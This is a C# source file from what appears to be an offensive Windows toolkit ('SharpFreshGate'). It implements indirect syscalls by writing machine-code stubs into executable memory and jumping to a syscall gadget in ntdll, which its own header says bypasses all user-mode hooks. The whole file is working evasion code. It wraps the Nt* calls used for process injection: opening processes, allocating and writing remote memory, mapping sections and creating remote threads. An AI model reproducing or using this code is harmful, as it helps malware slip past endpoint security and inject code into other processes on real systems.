/**
 * IndirectSyscall.cs - Indirect syscall execution via assembly stubs
 * 
 * Executes syscalls by:
 * 1. Setting up arguments according to Windows x64 calling convention
 * 2. Loading SSN into RAX
 * 3. Jumping to a clean syscall;ret gadget in ntdll.dll
 * 
 * This bypasses all user-mode hooks on Nt* functions.
 */

using System;
using System.Runtime.InteropServices;

namespace SharpFreshGate.Core
{
    /// <summary>
    /// Indirect syscall executor - calls Nt* functions without going through hooks
    /// </summary>
    public static class IndirectSyscall
    {
        // Delegate for our syscall stub
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int SyscallDelegate(
            IntPtr arg1, IntPtr arg2, IntPtr arg3, IntPtr arg4,
            IntPtr arg5, IntPtr arg6, IntPtr arg7, IntPtr arg8,
            IntPtr arg9, IntPtr arg10, IntPtr arg11, IntPtr arg12);

        private static IntPtr _stubMemory = IntPtr.Zero;
        private static SyscallDelegate _syscallExecutor = null;
        private static bool _initialized = false;

        private const int STUB_SIZE = 128;

        /// <summary>
        /// Initialize the indirect syscall stub
        /// </summary>
        public static bool Initialize()
        {
            if (_initialized)
                return true;

            Logger.Info("Initializing indirect syscall executor...");

            // Allocate executable memory for our stub
            _stubMemory = DynamicInvoke.VirtualAlloc(
                IntPtr.Zero,
                (UIntPtr)STUB_SIZE,
                NativeConstants.MEM_COMMIT | NativeConstants.MEM_RESERVE,
                NativeConstants.PAGE_EXECUTE_READWRITE);

            if (_stubMemory == IntPtr.Zero)
            {
                Logger.Error($"Failed to allocate stub memory: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Logger.DebugAddress("Syscall stub memory", _stubMemory);

            // Create the delegate for our stub
            _syscallExecutor = Marshal.GetDelegateForFunctionPointer<SyscallDelegate>(_stubMemory);

            _initialized = true;
            Logger.Success("Indirect syscall executor initialized");
            return true;
        }

        /// <summary>
        /// Prepare the syscall stub with the given SSN and syscall gadget address
        /// </summary>
        private static void PrepareStub(ushort ssn, IntPtr syscallGadget)
        {
            // x64 syscall stub:
            // 
            // Windows x64 calling convention:
            // RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
            // Stack: arg5, arg6, ...
            //
            // For syscalls:
            // R10 = RCX (syscall uses R10 instead of RCX)
            // RAX = SSN
            // Then jump to syscall;ret
            //
            // Our stub receives args via delegate call, we just need to:
            // 1. mov r10, rcx
            // 2. mov eax, SSN
            // 3. jmp [syscall;ret gadget]

            byte[] stub = new byte[STUB_SIZE];
            int offset = 0;

            // mov r10, rcx (4C 8B D1)
            stub[offset++] = 0x4C;
            stub[offset++] = 0x8B;
            stub[offset++] = 0xD1;

            // mov eax, SSN (B8 XX XX 00 00)
            stub[offset++] = 0xB8;
            stub[offset++] = (byte)(ssn & 0xFF);
            stub[offset++] = (byte)((ssn >> 8) & 0xFF);
            stub[offset++] = 0x00;
            stub[offset++] = 0x00;

            // mov r11, syscallGadget (49 BB XX XX XX XX XX XX XX XX)
            stub[offset++] = 0x49;
            stub[offset++] = 0xBB;
            byte[] gadgetBytes = BitConverter.GetBytes(syscallGadget.ToInt64());
            Array.Copy(gadgetBytes, 0, stub, offset, 8);
            offset += 8;

            // jmp r11 (41 FF E3)
            stub[offset++] = 0x41;
            stub[offset++] = 0xFF;
            stub[offset++] = 0xE3;

            // Write stub to memory
            Marshal.Copy(stub, 0, _stubMemory, stub.Length);
        }

        /// <summary>
        /// Execute a syscall with the given entry and arguments
        /// </summary>
        public static int Execute(SyscallEntry entry, params IntPtr[] args)
        {
            if (!_initialized)
            {
                if (!Initialize())
                    throw new Exception("Failed to initialize indirect syscall");
            }

            if (entry == null)
                throw new ArgumentNullException(nameof(entry));

            if (entry.SyscallAddress == IntPtr.Zero)
                throw new Exception($"No syscall address for {entry.FunctionName}");

            // Prepare stub with this syscall's SSN and gadget
            PrepareStub(entry.SSN, entry.SyscallAddress);

            // Pad args to 12 (max we support)
            IntPtr[] paddedArgs = new IntPtr[12];
            for (int i = 0; i < args.Length && i < 12; i++)
            {
                paddedArgs[i] = args[i];
            }

            Logger.Info($"Executing indirect syscall: {entry.FunctionName} (SSN=0x{entry.SSN:X4})");

            // Execute the syscall
            return _syscallExecutor(
                paddedArgs[0], paddedArgs[1], paddedArgs[2], paddedArgs[3],
                paddedArgs[4], paddedArgs[5], paddedArgs[6], paddedArgs[7],
                paddedArgs[8], paddedArgs[9], paddedArgs[10], paddedArgs[11]);
        }

        /// <summary>
        /// NtAllocateVirtualMemory via indirect syscall
        /// </summary>
        public static int NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect)
        {
            var entry = SyscallResolver.NtAllocateVirtualMemory;
            if (entry == null)
                throw new Exception("NtAllocateVirtualMemory not resolved");

            // We need to pass pointers to BaseAddress and RegionSize
            IntPtr pBaseAddress = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr pRegionSize = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                Marshal.WriteIntPtr(pBaseAddress, BaseAddress);
                Marshal.WriteIntPtr(pRegionSize, RegionSize);

                int result = Execute(entry,
                    ProcessHandle,
                    pBaseAddress,
                    ZeroBits,
                    pRegionSize,
                    (IntPtr)AllocationType,
                    (IntPtr)Protect);

                BaseAddress = Marshal.ReadIntPtr(pBaseAddress);
                RegionSize = Marshal.ReadIntPtr(pRegionSize);

                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pBaseAddress);
                Marshal.FreeHGlobal(pRegionSize);
            }
        }

        /// <summary>
        /// NtProtectVirtualMemory via indirect syscall
        /// </summary>
        public static int NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect)
        {
            var entry = SyscallResolver.NtProtectVirtualMemory;
            if (entry == null)
                throw new Exception("NtProtectVirtualMemory not resolved");

            IntPtr pBaseAddress = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr pRegionSize = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr pOldProtect = Marshal.AllocHGlobal(sizeof(uint));

            try
            {
                Marshal.WriteIntPtr(pBaseAddress, BaseAddress);
                Marshal.WriteIntPtr(pRegionSize, RegionSize);
                Marshal.WriteInt32(pOldProtect, 0);

                int result = Execute(entry,
                    ProcessHandle,
                    pBaseAddress,
                    pRegionSize,
                    (IntPtr)NewProtect,
                    pOldProtect);

                BaseAddress = Marshal.ReadIntPtr(pBaseAddress);
                RegionSize = Marshal.ReadIntPtr(pRegionSize);
                OldProtect = (uint)Marshal.ReadInt32(pOldProtect);

                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pBaseAddress);
                Marshal.FreeHGlobal(pRegionSize);
                Marshal.FreeHGlobal(pOldProtect);
            }
        }

        /// <summary>
        /// NtFreeVirtualMemory via indirect syscall
        /// </summary>
        public static int NtFreeVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint FreeType)
        {
            var entry = SyscallResolver.NtFreeVirtualMemory;
            if (entry == null)
                throw new Exception("NtFreeVirtualMemory not resolved");

            IntPtr pBaseAddress = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr pRegionSize = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                Marshal.WriteIntPtr(pBaseAddress, BaseAddress);
                Marshal.WriteIntPtr(pRegionSize, RegionSize);

                int result = Execute(entry,
                    ProcessHandle,
                    pBaseAddress,
                    pRegionSize,
                    (IntPtr)FreeType);

                BaseAddress = Marshal.ReadIntPtr(pBaseAddress);
                RegionSize = Marshal.ReadIntPtr(pRegionSize);

                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pBaseAddress);
                Marshal.FreeHGlobal(pRegionSize);
            }
        }

        /// <summary>
        /// NtWriteVirtualMemory via indirect syscall
        /// </summary>
        public static int NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToWrite,
            out uint NumberOfBytesWritten)
        {
            var entry = SyscallResolver.NtWriteVirtualMemory;
            if (entry == null)
                throw new Exception("NtWriteVirtualMemory not resolved");

            IntPtr pBytesWritten = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                Marshal.WriteIntPtr(pBytesWritten, IntPtr.Zero);

                int result = Execute(entry,
                    ProcessHandle,
                    BaseAddress,
                    Buffer,
                    (IntPtr)NumberOfBytesToWrite,
                    pBytesWritten);

                NumberOfBytesWritten = (uint)Marshal.ReadIntPtr(pBytesWritten).ToInt64();

                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pBytesWritten);
            }
        }

        /// <summary>
        /// NtOpenProcess via indirect syscall
        /// </summary>
        public static int NtOpenProcess(
            out IntPtr ProcessHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ClientId)
        {
            var entry = SyscallResolver.NtOpenProcess;
            if (entry == null)
                throw new Exception("NtOpenProcess not resolved");
            IntPtr pProcessHandle = Marshal.AllocHGlobal(IntPtr.Size);
            try
            {
                Marshal.WriteIntPtr(pProcessHandle, IntPtr.Zero);
                int result = Execute(entry,
                    pProcessHandle,
                    (IntPtr)DesiredAccess,
                    ObjectAttributes,
                    ClientId);
                ProcessHandle = Marshal.ReadIntPtr(pProcessHandle);
                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pProcessHandle);
            }
        }

        /// <summary>
        /// NtCreateSection via indirect syscall
        /// </summary>
        public static int NtCreateSection(
            out IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref long MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle)
        {
            var entry = SyscallResolver.NtCreateSection;
            if (entry == null)
                throw new Exception("NtCreateSection not resolved");
            IntPtr pSectionHandle = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr pMaximumSize = Marshal.AllocHGlobal(sizeof(long));
            try
            {
                Marshal.WriteIntPtr(pSectionHandle, IntPtr.Zero);
                Marshal.WriteInt64(pMaximumSize, MaximumSize);
                int result = Execute(entry,
                    pSectionHandle,
                    (IntPtr)DesiredAccess,
                    ObjectAttributes,
                    pMaximumSize,
                    (IntPtr)SectionPageProtection,
                    (IntPtr)AllocationAttributes,
                    FileHandle);
                SectionHandle = Marshal.ReadIntPtr(pSectionHandle);
                MaximumSize = Marshal.ReadInt64(pMaximumSize);
                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pSectionHandle);
                Marshal.FreeHGlobal(pMaximumSize);
            }
        }

        /// <summary>
        /// NtMapViewOfSection - indirect syscalls
        /// </summary>
        public static int NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect)
        {
            var entry = SyscallResolver.NtMapViewOfSection;
            if (entry == null)
                throw new Exception("NtMapViewOfSection not resolved");

            IntPtr pBaseAddress = Marshal.AllocHGlobal(IntPtr.Size);
            IntPtr pViewSize = Marshal.AllocHGlobal(sizeof(ulong));

            try
            {
                Marshal.WriteIntPtr(pBaseAddress, IntPtr.Zero);
                Marshal.WriteInt64(pViewSize, 0);

                int result = Execute(entry,
                    SectionHandle,
                    ProcessHandle,
                    pBaseAddress,
                    ZeroBits,
                    CommitSize,
                    SectionOffset,
                    pViewSize,
                    (IntPtr)InheritDisposition,
                    (IntPtr)AllocationType,
                    (IntPtr)Win32Protect);

                BaseAddress = Marshal.ReadIntPtr(pBaseAddress);
                ViewSize = (ulong)Marshal.ReadInt64(pViewSize);

                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pBaseAddress);
                Marshal.FreeHGlobal(pViewSize);
            }
        }

        /// <summary>
        /// NtUnmapViewOfSection - indirect syscall
        /// </summary>
        public static int NtUnmapViewOfSection(
            IntPtr ProcessHandle,
            IntPtr BaseAddress)
        {
            var entry = SyscallResolver.NtUnmapViewOfSection;
            if (entry == null)
                throw new Exception("NtUnmapViewOfSection not resolved");
            return Execute(entry, ProcessHandle, BaseAddress);
        }

        /// <summary>
        /// NtCreateThreadEx - indirect syscall
        /// </summary>
        public static int NtCreateThreadEx(
            out IntPtr ThreadHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr StartRoutine,
            IntPtr Argument,
            uint CreateFlags,
            IntPtr ZeroBits,
            IntPtr StackSize,
            IntPtr MaximumStackSize,
            IntPtr AttributeList)
        {
            var entry = SyscallResolver.NtCreateThreadEx;
            if (entry == null)
                throw new Exception("NtCreateThreadEx not resolved");
            
            IntPtr pThreadHandle = Marshal.AllocHGlobal(IntPtr.Size);
            try
            {
                Marshal.WriteIntPtr(pThreadHandle, IntPtr.Zero);
                
                int result = Execute(entry,
                    pThreadHandle,
                    (IntPtr)DesiredAccess,
                    ObjectAttributes,
                    ProcessHandle,
                    StartRoutine,
                    Argument,
                    (IntPtr)CreateFlags,
                    ZeroBits,
                    StackSize,
                    MaximumStackSize,
                    AttributeList);
                
                ThreadHandle = Marshal.ReadIntPtr(pThreadHandle);
                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(pThreadHandle);
            }
        }

        /// <summary>
        /// Get current process pseudo-handle (-1)
        /// </summary>
        public static IntPtr CurrentProcess => new IntPtr(-1);

        /// <summary>
        /// Check if NTSTATUS is success
        /// </summary>
        public static bool NT_SUCCESS(int status) => status >= 0;

        /// <summary>
        /// Cleanup
        /// </summary>
        public static void Cleanup()
        {
            if (_stubMemory != IntPtr.Zero)
            {
                DynamicInvoke.VirtualFree(_stubMemory, (UIntPtr)0, NativeConstants.MEM_RELEASE);
                _stubMemory = IntPtr.Zero;
                _initialized = false;
            }
        }
    }
}
